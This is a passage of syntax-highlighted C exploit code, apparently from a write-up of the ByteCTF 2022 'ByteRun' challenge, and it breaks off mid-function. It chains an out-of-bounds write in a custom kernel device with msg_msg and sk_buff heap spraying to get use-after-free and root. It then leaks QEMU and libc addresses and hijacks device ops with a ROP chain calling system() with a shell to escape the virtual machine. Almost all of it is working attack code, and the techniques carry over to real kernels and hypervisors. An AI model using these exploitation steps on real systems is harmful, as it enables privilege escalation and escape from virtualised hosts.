class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to received sk_buff!&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-type">int</span> socket_fd[<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">fake_data</span>;</span><br>    <span class="hljs-type">char</span> *trash_data;<br><br>    <span class="hljs-comment">/* free the first buffer in bytedev queue */</span><br>    trash_data = <span class="hljs-built_in">malloc</span>(BYTEDEV_BUF_SIZE);<br>    <span class="hljs-built_in">memset</span>(trash_data, <span class="hljs-number">0x84</span>, BYTEDEV_BUF_SIZE);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] write %ld bytes to dev \n&quot;</span>, <br>            write(dev_fd, trash_data, BYTEDEV_BUF_SIZE));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] read %ld bytes from dev\n&quot;</span>, <br>            read(dev_fd, trash_data, BYTEDEV_BUF_SIZE));<br><br>    <span class="hljs-comment">/* construct fake bytedev_data */</span><br>    fake_data = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev_data) + BYTEDEV_BUF_SIZE);<br>    fake_data-&gt;len = BYTEDEV_BUF_SIZE + <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] re-get the buffer by sk_buff...&quot;</span>);<br>    write(socket_fd[<span class="hljs-number">0</span>], fake_data, BYTEDEV_BUF_SIZE - <span class="hljs-number">320</span>);<br><br>    <span class="hljs-comment">/* make an OOB write */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB write to nearby object...&quot;</span>);<br>    write(dev_fd, trash_data, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* to prevent the memory leaking */</span><br>    <span class="hljs-built_in">free</span>(trash_data);<br>    <span class="hljs-built_in">free</span>(fake_data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemuEscape</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> dev_fd, ret;<br>    <span class="hljs-type">uint64_t</span> buf[BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)];<br>    <span class="hljs-type">uint64_t</span> fake_ops[BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)];<br>    <span class="hljs-type">uint64_t</span> libc_base, opaque, byte_dev_pmio_read;<br><br>    <span class="hljs-keyword">if</span> ((dev_fd = open(<span class="hljs-string">&quot;/dev/bytedev&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open bytedev!&quot;</span>);<br>    &#125;<br><br>    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, BYTEDEV_MODE_BLK);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * SECTOR -23: container</span><br><span class="hljs-comment">     * <span class="hljs-doctag">XXX:</span> in docker-built Ubuntu 22.04, we cannot leak libc there.</span><br><span class="hljs-comment">     *      [55] g_str_hash</span><br><span class="hljs-comment">     *      [56] g_str_equal</span><br><span class="hljs-comment">     * SECTOR -24: BYTEPCIDevState</span><br><span class="hljs-comment">     *      [27~34] name</span><br><span class="hljs-comment">     *      [35~] io_regions[PCI_NUM_REGIONS]</span><br><span class="hljs-comment">     * SECTOR -25: byte_dev_pmio_ops</span><br><span class="hljs-comment">     *      [0] byte_dev_pmio_read</span><br><span class="hljs-comment">     *      [1] byte_dev_pmio_write</span><br><span class="hljs-comment">     * SECTOR -355 &amp;io_regions[PCI_NUM_REGIONS]</span><br><span class="hljs-comment">     *      SECTOR -352 MemoryRegion - mmio</span><br><span class="hljs-comment">     *          [4] opaque</span><br><span class="hljs-comment">     *          [9] ops</span><br><span class="hljs-comment">     *      SECTOR -347 MemoryRegion - pmio</span><br><span class="hljs-comment">     *          [4] opaque</span><br><span class="hljs-comment">     *          [9] ops</span><br><span class="hljs-comment">     * SECTOR -388</span><br><span class="hljs-comment">     *      [8] &lt;g_str_hash&gt;</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I leak basic info</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.I leak basic\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -388 sector...\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-388</span>);<br>    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">7</span>] &lt; <span class="hljs-number">0x7f0000000000</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>); i++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[--data-dump--][%d] %lx\n&quot;</span>, i, buf[i]);<br>        &#125;<br>        errExit(<span class="hljs-string">&quot;failed to leak libc related ptr!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* This&#x27;s the offset on the Ubuntu 22.04: GLIBC 2.35-0ubuntu3.1 */</span><br>    libc_base = buf[<span class="hljs-number">7</span>] - <span class="hljs-number">0x3ea410</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got libc_base: \033[0m%lx\n&quot;</span>, libc_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -25 sector...\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-25</span>);<br>    read(dev_fd, fake_ops, BYTEDEV_SECTOR_SIZE);<br>    byte_dev_pmio_read = fake_ops[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got byte_dev_pmio_read: \033[0m%lx\n&quot;</span>, <br>            byte_dev_pmio_read);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -347 sector...\033[0m&quot;</span>);<br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-347</span>);<br>    read(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br>    opaque = buf[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got opaque: \033[0m%lx\n&quot;</span>, opaque);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II construct fake pmio-&gt;ops</span><br><span class="hljs-comment">     * There we make the opaque.parent_obj.name the ops,</span><br><span class="hljs-comment">     * so that nothing will be effects</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.II construct fake pmio-&gt;ops\033[0m&quot;</span>);<br>    <br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-24</span>);<br>    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    buf[<span class="hljs-number">33</span>] = buf[<span class="hljs-number">34</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span>*)&amp;buf[<span class="hljs-number">33</span>], <span class="hljs-string">&quot;ls;cat ./flag;gnome-calculator;/bin/sh&quot;</span>);<br><br>    <span class="hljs-comment">/* the new rdx starts there */</span><br>    buf[<span class="hljs-number">28</span>] = libc_base + LIBC_POP_RDI_RET;<br>    buf[<span class="hljs-number">29</span>] = opaque + <span class="hljs-number">33</span> * <span class="hljs-number">8</span>;<span class="hljs-comment">//libc_base + LIBC_BIN_SH;</span><br>    buf[<span class="hljs-number">30</span>] = libc_base + LIBC_SYSTEM;<br>    <span class="hljs-comment">//buf[31] = </span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * [rdx + 20]</span><br><span class="hljs-comment">     * mov rsp, rdx ; ret</span><br><span class="hljs-comment">     */</span><br>    buf[<span class="hljs-number">32</span>] = libc_base + LIBC_MOV_RSP_RDX_RET;<br><br>    <span class="hljs-comment">/* the [rdi + 8] */</span><br>    buf[<span class="hljs-number">1</span>] = opaque + <span class="hljs-number">28</span> * <span class="hljs-number">8</span>;<br><br>    <span class="hljs-comment">/* fake ops on bar space */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        buf[<span class="hljs-number">50</span> + i] = fake_ops[i];<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * mov rdx, qword ptr [rdi + 8] ; -&gt; store the ptr in opaque[1]</span><br><span class="hljs-comment">     * mov qword ptr [rsp], rax ; </span><br><span class="hljs-comment">     * call qword ptr [rdx + 0x20]  -&gt; another call</span><br><span class="hljs-comment">     */</span><br>    buf[<span class="hljs-number">51</span>] = <br>        libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;<br><br>    write(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III change pmio-&gt;ops to fake ops on opaque</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.III change pmio-&gt;ops to fake ops\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-347</span>);<br>    read(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>    buf[<span class="hljs-number">9</span>] = opaque + <span class="hljs-number">50</span> * <span class="hljs-number">8</span>;<br>    write(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV trigger fake pmio-&gt;ops.read to escape</span><br><span class="hljs-comment">     * There we need to set opaque[1] to opaque.parent_obj.name</span><br><span class="hljs-comment">     * and do something wonderful there...</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.IV trigger fake ops to escape\n\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">//sleep(5);</span><br>    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid()) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m\n[*] Now we come to Stage II - QEMU ESCAPE\033[0m\n&quot;</span>);<br>    qemuEscape();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_socket[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br>    <span class="hljs-type">int</span>         dev_fd;<br>    <span class="hljs-type">int</span>         ret;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.0</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m\n[+] ByteCTF 2022 - ByteRun - exploit \033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m\n[*] Stage I - ROOT Privilege Escalation. \033[0m\n&quot;</span>);<br><br>    <span class="hljs-comment">/* basic resources alloc */</span><br>    saveStatus();<br><br>    <span class="hljs-keyword">if</span> ((dev_fd = open(<span class="hljs-string">&quot;/dev/bytedev&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open bytedev!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, oob_socket) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create socket pair for OOB write!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>    <br>    <span class="hljs-comment">/* socket pairs to spray sk_buff */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.I spray msg_msg for overlapping obj\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">/* build 4096 message queue */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">/* spray primary and secondary message */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br><br>        ret = writeMsg(msqid[i], <br>                    &amp;primary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(primary_msg), <br>                    PRIMARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br>        &#125;<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br><br>        ret = writeMsg(msqid[i], <br>                    &amp;secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                    SECONDARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* create hole in primary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>) &#123;<br>        ret = readMsg(msqid[i], <br>                    &amp;primary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(primary_msg), <br>                    PRIMARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* triger off-by-null on primary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(dev_fd, oob_socket);<br><br>    <span class="hljs-comment">/* find the queues that have the same secondary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-comment">/* the hole */</span><br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">256</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i) &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d &quot;</span>, victim_qid);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, real_qid);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* free the victim secondary msg_msg, then we get a UAF */</span><br>    ret = readMsg(msqid[real_qid], <br>                &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                SECONDARY_MSG_TYPE);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* spray sk_buff to construct fake msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    ret = spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* use fake msg_msg to read OOB */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    &#125;<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * release and re-spray sk_buff to construct fake msg_msg</span><br><span class="hljs-comment">     * so that we can make an arbitrary read on a primary msg_msg</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* cal the addr of UAF obj by the header we just read out */</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    